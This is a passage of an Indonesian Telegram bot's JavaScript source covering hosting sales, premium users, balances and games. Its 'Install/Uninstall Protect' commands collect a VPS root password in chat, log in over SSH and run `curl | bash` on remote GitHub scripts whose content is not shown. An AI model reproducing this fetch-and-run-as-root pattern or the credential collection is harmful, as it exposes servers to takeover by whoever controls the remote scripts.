/*
  --> Scripts Vyxxz! - BOT
  --> Via Telegram
  --> Developer t.me/ReyValdz
  
  
  Note :
    --> Gunakan dengan bijak
    --> No Sebar
    



-# © Powered By AldzyIsHere
*/

const {
    tanggal,
    capital,
    imagesys,
    menuimage,
    isGroupOnly,
    setGroupOnly,
    saveCooldown,
    checkCooldown,
    setCooldown,
    sleep,
    isOwner,
    ensureFileExists,
    savePremiumUsers,
    watchFile,
    toRupiah, 
    isPremium,
    getPremiumStatusSymbol,
    addPremium,
    delPremium,
    listPremiumUsers,
    sendIfNotPremium,
    loadLimits,
    saveLimits,
    checkAndResetLimits,
    savePartnerUsers, 
    addPartner, 
    removePartner, 
    sendIfNotPartner, 
    listPartnerUsers, 
    isPartner, 
    removeAdmin, 
    addAdmin, 
    sendNotifAdminOrOwner, 
    isAdminOrOwner, 
    getUserLimit,
    useLimit,
    addUserLimit,
    deductUserLimit,
    setUserLimit,
    getAllLimits,
    resetAllLimits,
    getCurrentLimit,
    addToLimit,
    deductFromLimit,
    ensureUserHasLimitData,
    logger, 
    Photo,
    Cukimay, 
    formatBytes, 
    getRamInfo, 
    getSpeed, 
    formatRuntime, 
    getBotRuntime, 
    botStart, 
    formatNumber, 
    runtime,
    parseDuration,
    getTargetUserId
} = require('./function.js');

const fs = require('fs');
const { Telegraf, Markup } = require("telegraf");
const pino = require('pino');
const crypto = require('crypto');
const { Client } = require('ssh2');
const chalk = require('chalk');
const path = require("path");
const { createCanvas, loadImage } = require("@napi-rs/canvas");
const moment = require('moment-timezone');
const axios = require("axios");
const archiver = require('archiver');
const FormData = require('form-data');
const { getDiskInfoSync } = require("node-disk-info");
const os = require("os");
const JsConfuser = require('js-confuser');
const figlet = require('figlet');
const gradient = require('gradient-string');
const { default: boxen } = require('boxen');
const ora = require('ora');
const mime = require('mime-types');
const { exec } = require('child_process');
const zlib = require('zlib');
const { performance } = require('perf_hooks');
const fetch = require('node-fetch').default || require('node-fetch');
const { NodeSSH } = require("node-ssh");
const dns = require("dns");
const QRCode = require("qrcode");

// --------------------------------------------------------------------------
// [ CONFIGURATION ]
// --------------------------------------------------------------------------
const config = require("./settings/config.js");
const tokens = config.tokens;
const OWNER_ID = config.owner;
const CHANNEL_ID = config.channel_id;
const USN_BOT = config.username;
const bot = new Telegraf(tokens);
bot.use(logger);

const {
    ownerID,
    Aldz,
    domain, 
    capikey, apikey, nestid, egg, loc,
    domainV2, capikeyV2, apikeyV2, nestidV2, eggV2, locV2,
    domainV3, capikeyV3, apikeyV3, nestidV3, eggV3, locV3,
    domainV4, capikeyV4, apikeyV4, nestidV4, eggV4, locV4,
    domainV5, capikeyV5, apikeyV5, nestidV5, eggV5, locV5
} = require("./settings/config");


// --------------------------------------------------------------------------
// [ DATABASE PATHS ]
// --------------------------------------------------------------------------
const modebot = "./FileData/database/setgrup.json";
const verifiedFile = "./FileData/database/verified_users.json";
const cd = "./FileData/database/cd.json";
const userFile = "./FileData/database/users.json";
const fileGroup = "./FileData/database/groups.json";
const premiumFile = path.join(__dirname, "./FileData/database/premium.json");
const adminFile = path.join(__dirname, "./FileData/database/admin.json");
const partnerFile = path.join(__dirname, "./FileData/database/partner.json");
const cdFile = path.join(__dirname, "./FileData/database/cd.json");
const FILTER_FILE = path.join(__dirname, "./FileData/database/filter.json");
const SALDO_FILE = path.join(__dirname, "./FileData/database/saldousers.json");


// --------------------------------------------------------------------------
// [ GLOBAL VARIABLES ]
// --------------------------------------------------------------------------
const delaySharemsg = {};
const userLimits = {};
const broadcastLock = new Map();
const userSpam = new Map();
const MIDD = 5;
const SPAM_TIME = 4000;
let waitingContactReply = {};
let premiumUsers = [];
let adminUsers = [];
let partnerUsers = [];

const doSession = new Map();
const vpsOrderSession = new Map();
const panelSession = new Map();
const ScriptSession = new Map();
const QRIS_EXPIRE = 15 * 60 * 1000;
const userSessions = new Map();
const Livechat = new Map();
const ForMessenger = new Map();
const filterStep = {};
const tempTrigger = {};
const antiLinkStatus = {};
const linkRegex = /(https?:\/\/|t\.me\/|telegram\.me\/|www\.)/i;

const scTemp = {};
const memory = {};
const cekIdChCache = {};
const autoAIStatus = new Map();
const activeGames = new Map();
const PROVINCE_PER_PAGE = 5;
const CITY_PER_PAGE = 6;
const kotaID = require("./FileData/kota-id");
const blinkshot = require("./FileData/blinkshot");
const perangCooldown = {};
const jail = {};
const DprNgentod = ['Sahroni', 'Bobi', 'Bahlil', 'Joko', 'Susi', 'Budi', 'Ani', 'Rudi', 'Lisa', 'Agus', 'Maya', 'Fajar', 'Dewi', 'Hendra', 'Rina', 'Ahmad', 'Sari'];

(async () => {
    const success = await imagesys();
    if (!success) {
        process.exit(1);
    }
    
// --------------------------------------------------------------------------
// [ DIGITALOCEAN API ]
// --------------------------------------------------------------------------
global.apiDigitalOcean = {};
for (let i = 1; i <= 50; i++) {
    let key = `ApiDO${i}`;
    global.apiDigitalOcean[`akun${i}`] = config[key] || "-";
}

// --------------------------------------------------------------------------
// [ SERVERS CONFIG ]
// --------------------------------------------------------------------------
const servers2 = {
  srv1: {
    name: "SERVER 1",
    domain: "",
    token: "",
    price: 8000 // ganti harga
  },
  srv2: {
    name: "SERVER 2",
    domain: "",
    token: "",
    price: 10000
  },
  srv3: {
    name: "SERVER 3",
    domain: "",
    token: "",
    price: 15000
  }
};

const servers = {
  srv1: {
    name: "Server 1",
    domain: "",
    token: "",
    egg: 15,
    loc: 1,
    sizes: { // ganti sesuai harga
      "1gb":  { memory: 1024,  cpu: 40,  disk: 1024,  price: 500 },
      "2gb":  { memory: 2048,  cpu: 60,  disk: 2048,  price: 1000 },
      "3gb":  { memory: 3072,  cpu: 70,  disk: 3072,  price: 2000 },
      "4gb":  { memory: 4096,  cpu: 80,  disk: 4096,  price: 3000 },
      "5gb":  { memory: 5120,  cpu: 90,  disk: 5120,  price: 4000 },
      "6gb":  { memory: 6144,  cpu: 100, disk: 6144,  price: 5000 },
      "7gb":  { memory: 7168,  cpu: 200, disk: 7168,  price: 6000 },
      "8gb":  { memory: 8192,  cpu: 350, disk: 8192,  price: 7000 },
      "9gb":  { memory: 9216,  cpu: 400, disk: 9216,  price: 8000 },
      "10gb": { memory: 10240, cpu: 500, disk: 10240, price: 9000 },
      "unli": { memory: 0,     cpu: 0,   disk: 0,     price: 5000 }
    }
  },

  srv2: {
    name: "Server 2", // ganti
    domain: "", 
    token: "",
    egg: 15,
    loc: 1,
    sizes: { // ganti sesuai harga 
      "1gb":  { memory: 1024,  cpu: 50,  disk: 1024,  price: 1000 },
      "2gb":  { memory: 2048,  cpu: 70,  disk: 2048,  price: 2000 },
      "3gb":  { memory: 3072,  cpu: 90,  disk: 3072,  price: 3000 },
      "4gb":  { memory: 4096,  cpu: 100, disk: 4096,  price: 4000 },
      "5gb":  { memory: 5120,  cpu: 120, disk: 5120,  price: 5000 },
      "6gb":  { memory: 6144,  cpu: 150, disk: 6144,  price: 6000 },
      "7gb":  { memory: 7168,  cpu: 200, disk: 7168,  price: 7000 },
      "8gb":  { memory: 8192,  cpu: 250, disk: 8192,  price: 8000 },
      "9gb":  { memory: 9216,  cpu: 300, disk: 9216,  price: 9000 },
      "10gb": { memory: 10240, cpu: 350, disk: 10240, price: 10000 },
      "unli": { memory: 0,     cpu: 0,   disk: 0,     price: 11000 }
    }
  },
  srv3: {
    name: "Server 3",
    domain: "",
    token: "",
    egg: 15,
    loc: 1,
    sizes: { // ganti sesuai harga 
      "1gb":  { memory: 1024,  cpu: 50,  disk: 1024,  price: 500 },
      "2gb":  { memory: 2048,  cpu: 70,  disk: 2048,  price: 1300 },
      "3gb":  { memory: 3072,  cpu: 90,  disk: 3072,  price: 2300 },
      "4gb":  { memory: 4096,  cpu: 100, disk: 4096,  price: 3400 },
      "5gb":  { memory: 5120,  cpu: 120, disk: 5120,  price: 4500 },
      "6gb":  { memory: 6144,  cpu: 150, disk: 6144,  price: 5600 },
      "7gb":  { memory: 7168,  cpu: 200, disk: 7168,  price: 6700 },
      "8gb":  { memory: 8192,  cpu: 250, disk: 8192,  price: 7800 },
      "9gb":  { memory: 9216,  cpu: 300, disk: 9216,  price: 8800 },
      "10gb": { memory: 10240, cpu: 350, disk: 10240, price: 9800 },
      "unli": { memory: 0,     cpu: 0,   disk: 0,     price: 10000 }
    }
  },
  srv4: {
    name: "Server 4",
    domain: "",
    token: "",
    egg: 15,
    loc: 1,
    sizes: { // ganti sesuai harga
      "1gb":  { memory: 1024,  cpu: 50,  disk: 1024,  price: 1000 },
      "2gb":  { memory: 2048,  cpu: 70,  disk: 2048,  price: 2000 },
      "3gb":  { memory: 3072,  cpu: 90,  disk: 3072,  price: 3000 },
      "4gb":  { memory: 4096,  cpu: 100, disk: 4096,  price: 4000 },
      "5gb":  { memory: 5120,  cpu: 120, disk: 5120,  price: 5000 },
      "6gb":  { memory: 6144,  cpu: 150, disk: 6144,  price: 6000 },
      "7gb":  { memory: 7168,  cpu: 200, disk: 7168,  price: 7000 },
      "8gb":  { memory: 8192,  cpu: 250, disk: 8192,  price: 8000 },
      "9gb":  { memory: 9216,  cpu: 300, disk: 9216,  price: 9000 },
      "10gb": { memory: 10240, cpu: 350, disk: 10240, price: 10000 },
      "unli": { memory: 0,     cpu: 0,   disk: 0,     price: 15000 }
    }
  }
};

// --------------------------------------------------------------------------
// [ FILE SCRIPT MANAGER ]
// --------------------------------------------------------------------------
const fileScript = {
    scriptPath: path.join(__dirname, './FileData/database/Script.json'),
    scripts: new Map(),
    loadScripts: function() {
        try {
            const dirPath = path.dirname(this.scriptPath);
            if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true });
            if (!fs.existsSync(this.scriptPath)) {
                console.log(`📁 File Script.json tidak ditemukan, membuat baru...`);
                this.scripts = new Map();
                this.saveScripts();
                return;
            }
            const data = fs.readFileSync(this.scriptPath, 'utf8');
            const parsed = JSON.parse(data);
            this.scripts = new Map(Object.entries(parsed));
        } catch (err) {
            console.error(`❌ Error script: ${err.message}`);
            this.scripts = new Map();
            this.saveScripts();
        }
    },
    saveScripts: function() {
        try {
            const dirPath = path.dirname(this.scriptPath);
            if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true });
            const obj = Object.fromEntries(this.scripts);
            fs.writeFileSync(this.scriptPath, JSON.stringify(obj, null, 2));
            console.log(`💾 Scripts saved to: ${this.scriptPath}`);
        } catch (err) {
            console.error(`❌ Error saving scripts: ${err.message}`);
        }
    },
    addScript: function(id, name, fileId, price, description = '') {
        this.scripts.set(id, { id, name, fileId, price, description, Time: Date.now() });
        this.saveScripts();
    },
    deleteScript: function(id) {
        const deleted = this.scripts.delete(id);
        if (deleted) this.saveScripts();
        return deleted;
    },
    getScript: function(id) {
        return this.scripts.get(id);
    },
    getAllScripts: function() {
        return Array.from(this.scripts.values());
    },
    getScriptsPage: function(page, itemsPerPage = 6) {
        const all = this.getAllScripts();
        const start = page * itemsPerPage;
        const end = start + itemsPerPage;
        return {
            scripts: all.slice(start, end),
            total: all.length,
            pages: Math.ceil(all.length / itemsPerPage),
            currentPage: page
        };
    }
};
fileScript.loadScripts();

// --------------------------------------------------------------------------
// [ INSTALL PROTECT ]
// --------------------------------------------------------------------------
function createInstallProtectCommand(commandName, scriptNumber, scriptUrl) {
    bot.command(commandName, async (ctx) => {
        const chatType = ctx.chat.type;
        
        const limitAllowed = await checkUserLimit(ctx, commandName);
        if (!limitAllowed) return;

        const args = ctx.message.text.split(" ").slice(1).join(" ");
        const input = args;

        if (!input.includes('|')) {
            return ctx.reply(`<blockquote>❌ <b>Salah format!</b>\n\nGunakan:\n<code>/${commandName} ipvps|pwvps</code></blockquote>`, { parse_mode: "HTML" });
        }

        const [ipvps, pwvps] = input.split('|').map(i => i.trim());
        if (!ipvps || !pwvps) {
            return ctx.reply(`<blockquote>❌ <b>Salah format!</b>\n\nGunakan:\n<code>/${commandName} ipvps|pwvps</code></blockquote>`, { parse_mode: "HTML" });
        }

        const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
        if (!ipRegex.test(ipvps)) {
            return ctx.reply('<blockquote>❌ <b>Format IP VPS tidak valid!</b>\n\nContoh: <code>123.123.123.123</code></blockquote>', { parse_mode: "HTML" });
        }

        const conn = new Client();

        try {
            await ctx.reply(`<blockquote>⏳ Menghubungkan ke VPS <b>${ipvps}</b> dan mulai instalasi Protect ${scriptNumber}...</blockquote>`, { parse_mode: "HTML" });

            let processCompleted = false;
            const timeout = setTimeout(() => {
                if (!processCompleted) {
                    try { conn.end(); conn.destroy(); } catch(e) {}
                    ctx.reply('<blockquote>⏱️ <b>Waktu koneksi habis!</b> Periksa VPS dan coba lagi.</blockquote>', { parse_mode: "HTML" });
                }
            }, 60000);
            
            conn.on('ready', () => {
                ctx.reply(`<blockquote>⚙️ <b>Koneksi SSH berhasil!</b> Memulai instalasi Protect ${scriptNumber}...</blockquote>`, { parse_mode: "HTML" });
                
                conn.exec(`curl -fsSL ${scriptUrl} | bash -s`, (err, stream) => {
                    if (err) {
                        processCompleted = true;
                        clearTimeout(timeout);
                        try { conn.end(); conn.destroy(); } catch(e) {}
                        return ctx.reply(`<blockquote>❌ <b>Gagal mengeksekusi perintah:</b>\n<code>${err.message}</code></blockquote>`, { parse_mode: "HTML" });
                    }

                    let output = '';
                    let errorOutput = '';

                    stream.on('data', (data) => {
                        output += data.toString();
                    });

                    stream.stderr.on('data', (data) => {
                        errorOutput += `[ERROR] ${data.toString()}`;
                    });

                    stream.on('close', (code, signal) => {
                        processCompleted = true;
                        clearTimeout(timeout);
                        try { conn.end(); conn.destroy(); } catch(e) {}

                        const fullOutput = (output + (errorOutput ? '\n\nERROR LOG:\n' + errorOutput : '')).trim();
                        const displayOutput = fullOutput.slice(-3500) || '(tidak ada output)';
                        
                        let resultMessage = '';
                        if (code === 0) {
                            resultMessage = `<blockquote>✅ <b>Instalasi Protect ${scriptNumber} berhasil!</b> (Exit code: ${code})\n\n`;
                        } else {
                            resultMessage = `<blockquote>⚠️ <b>Instalasi Protect ${scriptNumber} selesai dengan peringatan</b> (Exit code: ${code})\n\n`;
                        }
                        
                        resultMessage += `📦 Output terakhir:\n<code>${displayOutput}</code></blockquote>`;
                        
                        ctx.reply(resultMessage, { parse_mode: "HTML" });
                    });
                });
            });

            conn.on('error', (err) => {
                if (!processCompleted) {
                    processCompleted = true;
                    clearTimeout(timeout);
                    try { conn.end(); conn.destroy(); } catch(e) {}
                    
                    let errorMessage = '<blockquote>❌ <b>Gagal terhubung ke VPS!</b>\n\nPeriksa:\n';
                    errorMessage += '1. IP VPS benar\n';
                    errorMessage += '2. Password root benar\n';
                    errorMessage += '3. Port SSH (22) terbuka\n';
                    errorMessage += '4. VPS sedang aktif\n\n';
                    errorMessage += `<b>Error detail:</b>\n<code>${err.message || 'Unknown error'}</code></blockquote>`;
                    
                    ctx.reply(errorMessage, { parse_mode: "HTML" });
                }
            });

            conn.connect({
                host: ipvps,
                port: 22,
                username: 'root',
                password: pwvps,
                readyTimeout: 25000,
                keepaliveInterval: 10000,
                keepaliveCountMax: 3
            });

        } catch (e) {
            console.error(`Error in /${commandName}:`, e);
            ctx.reply(`<blockquote>❌ <b>Terjadi kesalahan:</b>\n<code>${e.message}</code></blockquote>`, { parse_mode: "HTML" });
        }
    });
}

function createUninstallProtectCommand(commandName, scriptNumber, scriptUrl) {
    bot.command(commandName, async (ctx) => {
        const chatType = ctx.chat.type;

        const limitAllowed = await checkUserLimit(ctx, commandName);
        if (!limitAllowed) return;

        const args = ctx.message.text.split(" ").slice(1).join(" ");
        const input = args;

        if (!input.includes('|')) {
            return ctx.reply(`<blockquote>❌ <b>Salah format!</b>\n\nGunakan:\n<code>/${commandName} ipvps|pwvps</code></blockquote>`, { parse_mode: "HTML" });
        }

        const [ipvps, pwvps] = input.split('|').map(i => i.trim());
        if (!ipvps || !pwvps) {
            return ctx.reply(`<blockquote>❌ <b>Salah format!</b>\n\nGunakan:\n<code>/${commandName} ipvps|pwvps</code></blockquote>`, { parse_mode: "HTML" });
        }

        const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
        if (!ipRegex.test(ipvps)) {
            return ctx.reply('<blockquote>❌ <b>Format IP VPS tidak valid!</b>\n\nContoh: <code>123.123.123.123</code></blockquote>', { parse_mode: "HTML" });
        }

        const conn = new Client();

        try {
            await ctx.reply(`<blockquote>⏳ Menghubungkan ke VPS <b>${ipvps}</b> dan mulai uninstall Protect ${scriptNumber}...</blockquote>`, { parse_mode: "HTML" });

            let processCompleted = false;
            const timeout = setTimeout(() => {
                if (!processCompleted) {
                    try { conn.end(); conn.destroy(); } catch(e) {}
                    ctx.reply('<blockquote>⏱️ <b>Waktu koneksi habis!</b> Periksa VPS dan coba lagi.</blockquote>', { parse_mode: "HTML" });
                }
            }, 60000);
            
            conn.on('ready', () => {
                ctx.reply(`<blockquote>⚙️ <b>Koneksi SSH berhasil!</b> Memulai uninstall Protect ${scriptNumber}...</blockquote>`, { parse_mode: "HTML" });
                
                conn.exec(`curl -fsSL ${scriptUrl} | bash -s`, (err, stream) => {
                    if (err) {
                        processCompleted = true;
                        clearTimeout(timeout);
                        try { conn.end(); conn.destroy(); } catch(e) {}
                        return ctx.reply(`<blockquote>❌ <b>Gagal mengeksekusi perintah:</b>\n<code>${err.message}</code></blockquote>`, { parse_mode: "HTML" });
                    }

                    let output = '';
                    let errorOutput = '';

                    stream.on('data', (data) => {
                        output += data.toString();
                    });

                    stream.stderr.on('data', (data) => {
                        errorOutput += `[ERROR] ${data.toString()}`;
                    });

                    stream.on('close', (code, signal) => {
                        processCompleted = true;
                        clearTimeout(timeout);
                        try { conn.end(); conn.destroy(); } catch(e) {}

                        const fullOutput = (output + (errorOutput ? '\n\nERROR LOG:\n' + errorOutput : '')).trim();
                        const displayOutput = fullOutput.slice(-3500) || '(tidak ada output)';
                        
                        let resultMessage = '';
                        if (code === 0) {
                            resultMessage = `<blockquote>✅ <b>Uninstall Protect ${scriptNumber} berhasil!</b> (Exit code: ${code})\n\n`;
                        } else {
                            resultMessage = `<blockquote>⚠️ <b>Uninstall Protect ${scriptNumber} selesai dengan peringatan</b> (Exit code: ${code})\n\n`;
                        }
                        
                        resultMessage += `📦 Output terakhir:\n<code>${displayOutput}</code></blockquote>`;
                        
                        ctx.reply(resultMessage, { parse_mode: "HTML" });
                    });
                });
            });

            conn.on('error', (err) => {
                if (!processCompleted) {
                    processCompleted = true;
                    clearTimeout(timeout);
                    try { conn.end(); conn.destroy(); } catch(e) {}
                    
                    let errorMessage = '<blockquote>❌ <b>Gagal terhubung ke VPS!</b>\n\nPeriksa:\n';
                    errorMessage += '1. IP VPS benar\n';
                    errorMessage += '2. Password root benar\n';
                    errorMessage += '3. Port SSH (22) terbuka\n';
                    errorMessage += '4. VPS sedang aktif\n\n';
                    errorMessage += `<b>Error detail:</b>\n<code>${err.message || 'Unknown error'}</code></blockquote>`;
                    
                    ctx.reply(errorMessage, { parse_mode: "HTML" });
                }
            });

            conn.connect({
                host: ipvps,
                port: 22,
                username: 'root',
                password: pwvps,
                readyTimeout: 25000,
                keepaliveInterval: 10000,
                keepaliveCountMax: 3
            });

        } catch (e) {
            console.error(`Error in /${commandName}:`, e);
            ctx.reply(`<blockquote>❌ <b>Terjadi kesalahan:</b>\n<code>${e.message}</code></blockquote>`, { parse_mode: "HTML" });
        }
    });
}

const installprotect = [
    { number: 1, url: "https://raw.githubusercontent.com/ALDZISHERE/Installprotect/main/Protect1.sh" },
    { number: 2, url: "https://raw.githubusercontent.com/ALDZISHERE/Installprotect/main/Protect2.sh" },
    { number: 3, url: "https://raw.githubusercontent.com/ALDZISHERE/Installprotect/main/Protect3.sh" },
    { number: 4, url: "https://raw.githubusercontent.com/ALDZISHERE/Installprotect/main/Protect4.sh" },
    { number: 5, url: "https://raw.githubusercontent.com/ALDZISHERE/Installprotect/main/Protect5.sh" },
    { number: 6, url: "https://raw.githubusercontent.com/ALDZISHERE/Installprotect/main/Protect6.sh" },
    { number: 7, url: "https://raw.githubusercontent.com/ALDZISHERE/Installprotect/main/Protect7.sh" },
    { number: 8, url: "https://raw.githubusercontent.com/ALDZISHERE/Installprotect/main/Protect8.sh" },
    { number: 9, url: "https://raw.githubusercontent.com/ALDZISHERE/Installprotect/main/Protect9.sh" },
    { number: 10, url: "https://raw.githubusercontent.com/ALDZISHERE/Installprotect/main/Protect10.sh" },
    { number: 11, url: "https://raw.githubusercontent.com/ALDZISHERE/Installprotect/main/Protect11.sh" },
    { number: 12, url: "https://raw.githubusercontent.com/ALDZISHERE/Installprotect/main/Protect12.sh" },
    { number: 13, url: "https://raw.githubusercontent.com/ALDZISHERE/Installprotect/main/Protect13.sh" },
    { number: 14, url: "https://raw.githubusercontent.com/ALDZISHERE/Installprotect/main/Protect14.sh" },
    { number: 15, url: "https://raw.githubusercontent.com/ALDZISHERE/Installprotect/main/Protect15.sh" },
    { number: 16, url: "https://raw.githubusercontent.com/ALDZISHERE/Installprotect/main/Protect16.sh" }
];

const Uninstallprotect = [
    { number: 1, url: "https://raw.githubusercontent.com/ALDZISHERE/Uninstallprotect/main/Aldz1.sh" },
    { number: 2, url: "https://raw.githubusercontent.com/ALDZISHERE/Uninstallprotect/main/Aldz2.sh" },
    { number: 3, url: "https://raw.githubusercontent.com/ALDZISHERE/Uninstallprotect/main/Aldz3.sh" },
    { number: 4, url: "https://raw.githubusercontent.com/ALDZISHERE/Uninstallprotect/main/Aldz4.sh" },
    { number: 5, url: "https://raw.githubusercontent.com/ALDZISHERE/Uninstallprotect/main/Aldz5.sh" },
    { number: 6, url: "https://raw.githubusercontent.com/ALDZISHERE/Uninstallprotect/main/Aldz6.sh" },
    { number: 7, url: "https://raw.githubusercontent.com/ALDZISHERE/Uninstallprotect/main/Aldz7.sh" },
    { number: 8, url: "https://raw.githubusercontent.com/ALDZISHERE/Uninstallprotect/main/Aldz8.sh" },
    { number: 9, url: "https://raw.githubusercontent.com/ALDZISHERE/Uninstallprotect/main/Aldz9.sh" },
    { number: 10, url: "https://raw.githubusercontent.com/ALDZISHERE/Uninstallprotect/main/Aldz10.sh" },
    { number: 11, url: "https://raw.githubusercontent.com/ALDZISHERE/Uninstallprotect/main/Aldz11.sh" },
    { number: 12, url: "https://raw.githubusercontent.com/ALDZISHERE/Uninstallprotect/main/Aldz12.sh" },
    { number: 13, url: "https://raw.githubusercontent.com/ALDZISHERE/Uninstallprotect/main/Aldz13.sh" },
    { number: 14, url: "https://raw.githubusercontent.com/ALDZISHERE/Uninstallprotect/main/Aldz14.sh" },
    { number: 15, url: "https://raw.githubusercontent.com/ALDZISHERE/Uninstallprotect/main/Aldz15.sh" },
    { number: 16, url: "https://raw.githubusercontent.com/ALDZISHERE/Uninstallprotect/main/Aldz16.sh" }
];

const countries = [
    { name: 'Amerika Serikat', rank: 1, basePower: 10 },
    { name: 'Rusia', rank: 2, basePower: 9 },
    { name: 'China', rank: 3, basePower: 9 },
    { name: 'India', rank: 4, basePower: 8 },
    { name: 'Korea Selatan', rank: 5, basePower: 7 },
    { name: 'Britania Raya', rank: 6, basePower: 7 },
    { name: 'Perancis', rank: 7, basePower: 7 },
    { name: 'Jepang', rank: 8, basePower: 7 },
    { name: 'Turkiye', rank: 9, basePower: 6 },
    { name: 'Italia', rank: 10, basePower: 6 },
    { name: 'Brasil', rank: 11, basePower: 6 },
    { name: 'Pakistan', rank: 12, basePower: 6 },
    { name: 'Indonesia', rank: 13, basePower: 5 },
    { name: 'Jerman', rank: 14, basePower: 5 },
    { name: 'Israel', rank: 15, basePower: 5 },
    { name: 'Iran', rank: 16, basePower: 5 },
    { name: 'Spanyol', rank: 17, basePower: 5 },
    { name: 'Australia', rank: 18, basePower: 5 },
    { name: 'Mesir', rank: 19, basePower: 4 },
    { name: 'Ukraina', rank: 20, basePower: 4 },
    { name: 'Polandia', rank: 21, basePower: 4 },
    { name: 'Taiwan', rank: 22, basePower: 4 },
    { name: 'Vietnam', rank: 23, basePower: 4 },
    { name: 'Saudi Arabia', rank: 24, basePower: 4 },
    { name: 'Thailand', rank: 25, basePower: 3 },
    { name: 'Aljazair', rank: 26, basePower: 3 },
    { name: 'Sweden', rank: 27, basePower: 3 },
    { name: 'Kanada', rank: 28, basePower: 3 },
    { name: 'Singapura', rank: 29, basePower: 3 },
    { name: 'Yunani', rank: 30, basePower: 3 },
    { name: 'Nigeria', rank: 31, basePower: 3 },
    { name: 'Mexico', rank: 32, basePower: 3 },
    { name: 'Argentina', rank: 33, basePower: 2 },
    { name: 'Korea Utara', rank: 34, basePower: 2 },
    { name: 'Bangladesh', rank: 35, basePower: 2 },
    { name: 'Belanda', rank: 36, basePower: 2 },
    { name: 'Myanmar', rank: 37, basePower: 2 },
    { name: 'Norwegia', rank: 38, basePower: 2 },
    { name: 'Portugal', rank: 39, basePower: 2 },
    { name: 'Afrika Selatan', rank: 40, basePower: 2 },
    { name: 'Filipina', rank: 41, basePower: 2 },
    { name: 'Malaysia', rank: 42, basePower: 2 },
];

const NSFW_APIS = [
    async () => {
        const res = await axios.get('https://res-api-liard.vercel.app/random/nsfw?apikey=Fyzz', { timeout: 20000 });
        return res.data?.result?.url || res.data?.result || res.data?.data || res.data?.url;
    },
    async () => {
        const res = await axios.get('https://api.waifu.pics/nsfw/waifu', { timeout: 20000 });
        return res.data?.url;
    },
];

const khodamList = [
    'Macan Putih', 'Elang Hitam', 'Kura-kura Sakti', 'Harimau Sumatera',
    'Biawak Mistis', 'Ular Naga Emas', 'Kucing Hitam Gaib', 'Burung Garuda',
    'Kijang Perak', 'Rusa Bertanduk Emas',
];

const DELAY_ON_LIMIT = 5000;
const buttonsBot = [
    [
        { text: '𝖡𝗎𝗒 𝖲𝖼𝗋𝗂𝗉𝗍', url: 'https://t.me/ReyValdz' }
    ],
    [
        { text: '𝖮𝗐𝗇𝖾𝗋 𝖲𝖼𝗋𝗂𝗉𝗍', url: 'https://t.me/ReyValdz' },
        { text: 'Bots Information', url: 'https://t.me/Xtrol_Team' },
    ],
];

// --------------------------------------------------------------------------
// [ HELPER FUNCTIONS ]
// --------------------------------------------------------------------------
// Fungsi untuk membaca saldo user
function loadSaldo() {
    try {
        if (!fs.existsSync(SALDO_FILE)) {
            fs.writeFileSync(SALDO_FILE, JSON.stringify({}));
            return {};
        }
        return JSON.parse(fs.readFileSync(SALDO_FILE, 'utf8'));
    } catch (error) {
        console.error("❌ Error load saldo:", error.message);
        return {};
    }
}

// Fungsi untuk menyimpan saldo user
function saveSaldo(data) {
    try {
        fs.writeFileSync(SALDO_FILE, JSON.stringify(data, null, 2));
    } catch (error) {
        console.error("❌ Error save saldo:", error.message);
    }
}

// Fungsi untuk mendapatkan saldo user
function getUserSaldo(userId) {
    const saldo = loadSaldo();
    return saldo[userId] || 0;
}

// Fungsi untuk menambah/mengurangi saldo user
function updateUserSaldo(userId, amount) {
    const saldo = loadSaldo();
    if (!saldo[userId]) saldo[userId] = 0;
    saldo[userId] += amount;
    saveSaldo(saldo);
    return saldo[userId];
}

// Fungsi untuk memotong saldo (dengan validasi)
function deductUserSaldo(userId, amount) {
    const saldo = loadSaldo();
    const currentSaldo = saldo[userId] || 0;
    if (currentSaldo < amount) return false;
    saldo[userId] = currentSaldo - amount;
    saveSaldo(saldo);
    return true;
}

function ensureDb(file, defaultValue) {
    if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify(defaultValue, null, 2));
}

function loadFilter() {
    return JSON.parse(fs.readFileSync(FILTER_FILE));
}

function saveFilter(data) {
    fs.writeFileSync(FILTER_FILE, JSON.stringify(data, null, 2));
}

function loadPremiumUsers() {
    try {
        if (fs.existsSync(premiumFile)) {
            const data = JSON.parse(fs.readFileSync(premiumFile, 'utf8'));
            return Array.isArray(data) ? data : [];
        }
    } catch (error) {
        console.error("⚠️ Error loading premium users:", error.message);
    }
    return [];
}

function loadAdminUsers() {
    if (fs.existsSync(adminFile)) return JSON.parse(fs.readFileSync(adminFile));
    return [];
}

function loadPartnerUsers() {
    if (fs.existsSync(partnerFile)) return JSON.parse(fs.readFileSync(partnerFile));
    return [];
}

function paginateArray(array, itemsPerPage = 10) {
    const pages = [];
    for (let i = 0; i < array.length; i += itemsPerPage) pages.push(array.slice(i, i + itemsPerPage));
    return pages;
}

function formatPremiumTime(expiredTimestamp) {
    const sisa = expiredTimestamp - Date.now();
    const hari = Math.ceil(sisa / (1000 * 60 * 60 * 24));
    if (hari <= 0) return "Expired";
    if (hari === 1) return "1 hari lagi";
    return `${hari} hari lagi`;
}

function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
}

async function checkCommandCooldownWrapper(ctx, commandName) {
    const userId = ctx.from.id.toString();
    return checkCooldown(userId, commandName);
}

function extractAnswer(data) {
    if (data.jawaban) return data.jawaban;
    if (data.answer) return data.answer;
    if (data.jawab) return data.jawab;
    return null;
}

function addLimit(userId, amount) {
    ensureUserHasLimitData(userId.toString());
    addToLimit(userId.toString(), amount);
}

function getLimit(userId) {
    return getCurrentLimit(userId.toString());
}

function escapeHTML(text) {
    return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

const rand = (n) => Array.from({ length: n }, () => 'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 36)]).join('');

function getRandom(length = 6) {
    return Math.random().toString(36).substring(2, 2 + length);
}

function isIP(text) {
    return /^(\d{1,3}\.){3}\d{1,3}$/.test(text);
}

function genRandomPass(length) {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let result = "";
    for (let i = 0; i < length; i++) result += chars[Math.floor(Math.random() * chars.length)];
    return result;
}

function rainbowLog(text) {
